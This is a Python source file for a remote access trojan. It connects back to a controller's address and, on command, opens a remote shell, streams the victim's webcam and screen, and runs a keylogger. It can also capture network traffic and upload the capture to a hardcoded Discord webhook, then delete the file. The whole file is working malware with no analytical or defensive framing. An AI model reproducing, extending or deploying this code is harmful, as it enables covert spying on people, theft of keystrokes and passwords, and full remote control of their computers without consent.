import socket
import cv2
import pyautogui
import numpy as np
import scapy.all as scapy
import threading
import requests
import subprocess
import os
import keyboard  # Import the keyboard library

INTERFACE = r"\Device\NPF_{3A38B79D-7A16-4BCA-BA01-5024A4F30AE1}"  # Explicitní síťové rozhraní
sniffer_running = False  # Globální proměnná pro kontrolu, zda už sniffing běží
lock = threading.Lock()  # Synchronizace vlákna
keylogger_data = []  # List to store keylogger data
keylogger_running = False  # Flag to check if keylogger is running

def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break
    cap.release()

def screen_stream(client_socket):
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        _, buffer = cv2.imencode('.jpg', frame)
        try:
            client_socket.sendall(buffer.tobytes())
        except:
            break

def sniffer_start():
    global sniffer_running
    with lock:  # Zabránění souběžnému spuštění více snifferů
        if sniffer_running:
            print("Sniffer is already running.")
            return
        sniffer_running = True

    pcap_file = 'target.cap'

    def sniff_and_save(pkt):
        scapy.wrpcap(pcap_file, pkt, append=True)

    try:
        print(f"Sniffing on interface: {INTERFACE}")
        scapy.sniff(iface=INTERFACE, timeout=60, prn=sniff_and_save, store=True)
    except Exception as e:
        print(f"Sniffer error: {e}")
    finally:
        sniffer_running = False  # Reset flagu po skončení sniffování

    if not os.path.exists(pcap_file):
        print("Sniffing failed: No packets captured.")
        return

    webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'
    try:
        with open(pcap_file, 'rb') as f:
            response = requests.post(webhook_url, files={'file': f})
        print("File uploaded:", response.status_code)

        os.remove(pcap_file)
        print("File deleted successfully.")

    except Exception as e:
        print("Upload failed:", str(e))

def shell(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command.lower() == "exit":
                break
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            client_socket.send(output.stdout.encode('utf-8') or b"Command executed, but no output.")
        except Exception as e:
            client_socket.send(str(e).encode('utf-8'))

def keylogger_callback(event):
    global keylogger_data
    keylogger_data.append(event.name)

def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(keylogger_callback)
        keylogger_running = True
        print("Keylogger started.")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print("Keylogger stopped.")

def dump_keylogger_data():
    global keylogger_data
    data = '\n'.join(keylogger_data)
    keylogger_data = []  # Clear the data after dumping
    return data

# Function to list webcams
def list_webcams():
    webcams = []
    index = 0
    while True:
        cap = cv2.VideoCapture(index)
        if cap.isOpened():
            # Get the webcam name (this depends on your platform)
            webcam_name = f"{index}: {cap.getBackendName()}"
            webcams.append(webcam_name)
            cap.release()
        else:
            break
        index += 1
    return '\n'.join(webcams)

def main():
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(('10.0.1.33', 9999))
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if command == "webcam_stream":
                threading.Thread(target=webcam_stream, args=(client_socket,), daemon=True).start()
            elif command == "screen_stream":
                threading.Thread(target=screen_stream, args=(client_socket,), daemon=True).start()
            elif command == "sniffer_start":
                threading.Thread(target=sniffer_start, daemon=True).start()
            elif command == "shell":
                shell(client_socket)
            elif command == "keyscan_start":
                start_keylogger()
            elif command == "keyscan_stop":
                stop_keylogger()
            elif command == "keyscan_dump":
                client_socket.send(dump_keylogger_data().encode('utf-8'))
            elif command == "webcam_list":
                print("[*] Requesting webcam list...")
                webcam_list = list_webcams()
                client_socket.send(webcam_list.encode('utf-8'))
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    main()
